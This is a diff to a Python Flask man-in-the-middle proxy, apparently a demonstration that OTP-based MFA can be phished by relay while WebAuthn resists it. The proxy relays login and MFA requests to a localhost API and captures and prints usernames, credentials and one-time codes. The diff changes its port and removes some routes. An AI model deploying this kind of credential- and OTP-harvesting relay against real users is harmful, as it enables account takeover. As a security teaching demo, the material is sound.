@@ -12,7 +12,7 @@ from datetime import datetime
 import threading
 
 class MITMProxy:
-    def __init__(self, target_url="http://localhost:5000", proxy_port=8080):
+    def __init__(self, target_url="http://localhost:5000", proxy_port=5001):
         self.target_url = target_url
         self.proxy_port = proxy_port
         self.app = Flask(__name__)
@@ -38,17 +38,9 @@ class MITMProxy:
         def proxy_login():
             return self.relay_and_capture_login()
         
-        @self.app.route('/mfa/enroll/totp', methods=['POST'])
-        def proxy_mfa_enroll():
-            return self.relay_request('/mfa/enroll/totp', 'POST')
-        
         @self.app.route('/mfa/verify', methods=['POST'])
         def proxy_mfa_verify():
             return self.relay_and_capture_otp()
-        
-        @self.app.route('/mfa/stats', methods=['GET'])
-        def proxy_mfa_stats():
-            return self.relay_request('/mfa/stats', 'GET')
         
         @self.app.route('/webauthn/register', methods=['POST'])
         def proxy_webauthn_register():
@@ -68,11 +60,6 @@ class MITMProxy:
                 'credentials': self.captured_credentials,
                 'otp': self.captured_otp
             })
-        
-        @self.app.route('/proxy/save', methods=['POST'])
-        def save_logs():
-            self.save_logs()
-            return jsonify({'status': 'success', 'message': 'Logs saved to mitm_logs.json'})
     
     def relay_request(self, endpoint, method='POST'):
         """
@@ -160,13 +147,11 @@ class MITMProxy:
         start_time = time.time()
         data = request.get_json()
         
-        # CAPTURE OTP/TOKEN
-        # Handle both 'otp' and 'token' parameter names
-        otp_value = data.get('otp') or data.get('token')
+        # CAPTURE OTP
         captured = {
             'timestamp': datetime.now().isoformat(),
             'username': data.get('username'),
-            'otp': otp_value,
+            'otp': data.get('otp'),
             'otp_type': data.get('otp_type', 'TOTP'),
             'captured_from': request.remote_addr
         }
@@ -174,7 +159,7 @@ class MITMProxy:
         
         print(f"\n[MITM] Captured OTP:")
         print(f"  Username: {captured['username']}")
-        print(f"  OTP/Token: {captured['otp']}")
+        print(f"  OTP: {captured['otp']}")
         print(f"  Type: {captured['otp_type']}")
         
         # RELAY TO REAL SERVER
@@ -383,15 +368,14 @@ if __name__ == "__main__":
     print("- WebAuthn: Protected by origin binding - relay attacks fail")
     print("-" * 70)
     
-    proxy = MITMProxy(target_url="http://localhost:5000", proxy_port=8080)
+    proxy = MITMProxy(target_url="http://localhost:5000", proxy_port=5001)
     
     # Run in separate thread to allow demonstration
     print("\nTo test the proxy:")
     print("1. Ensure the real API is running on port 5000")
-    print("2. Send requests to proxy at http://localhost:8080")
-    print("3. Check captured data at http://localhost:8080/proxy/captured")
-    print("4. View statistics at http://localhost:8080/proxy/stats")
-    print("5. Save logs at http://localhost:8080/proxy/save (POST)")
+    print("2. Send requests to proxy at http://localhost:5001")
+    print("3. Check captured data at http://localhost:5001/proxy/captured")
+    print("4. View statistics at http://localhost:5001/proxy/stats")
     print("\nStarting proxy server...\n")
     
     try:
